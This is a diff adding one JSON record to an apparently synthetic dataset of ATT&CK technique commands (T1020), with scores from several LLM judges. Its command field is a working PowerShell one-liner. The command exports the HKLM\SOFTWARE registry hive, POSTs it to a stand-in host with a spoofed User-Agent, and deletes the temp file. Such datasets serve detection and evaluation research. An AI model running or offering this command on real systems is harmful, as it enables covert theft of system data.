@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$ProgressPreference='SilentlyContinue'; $d=Join-Path $env:TEMP ('soft_'+(Get-Date -Format yyyyMMddHHmmss)+'.reg'); reg.exe export HKLM\\SOFTWARE $d /y > $null 2>&1; Invoke-WebRequest -Uri 'https://data.example.com/v1/upload/reg' -Method Post -InFile $d -ContentType 'application/octet-stream' -Headers @{ 'User-Agent'='Mozilla/5.0' } -ErrorAction SilentlyContinue; Remove-Item $d -Force",
+  "explanation": "Exports the HKLM\\SOFTWARE hive to a temp file and exfiltrates it via HTTPS POST, suppressing console output and progress.",
+  "rationale_steps": [
+    "Export a high-value registry hive using SYSTEM privileges.",
+    "Upload the resulting file with Invoke-WebRequest POST.",
+    "Redirect command output, suppress progress, and clean up."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-ed594729-e2d17a4d",
+  "source_prompt_hash": "ed594729",
+  "timestamp_utc": "2025-09-30T09:16:21.768830Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "PowerShell command is well-formed with balanced quotes/parentheses, valid redirections, correctly constructed hashtable headers, and appropriate argument usage.",
+        "semantic_score": 5,
+        "semantic_justification": "It exports HKLM\\SOFTWARE to a temp file, posts the file via HTTPS with Invoke-WebRequest, suppresses output, and cleans up, which aligns precisely with automated exfiltration (T1020).",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T04:17:55.929375Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with proper variable assignments, cmdlet usage, parameter passing, error handling, balanced quotes/parentheses/braces, and appropriate command separators.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements automated exfiltration by exporting registry data to a temporary file with timestamp, exfiltrating it via HTTPS POST with browser-like headers for evasion, and cleaning up the evidence afterward.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T06:00:30.421242Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with correct syntax for variable assignment, command chaining, parameter usage, redirection, and data structures.",
+        "semantic_score": 2,
+        "semantic_justification": "The command fails to achieve its claimed intent because exporting 'HKLM\\SOFTWARE' requires Administrator privileges, contradicting the stated 'Privilege: None' and causing the data collection step to fail, thus preventing any actual exfiltration.",
+        "combined_score": 3.5,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T06:00:45.573930Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
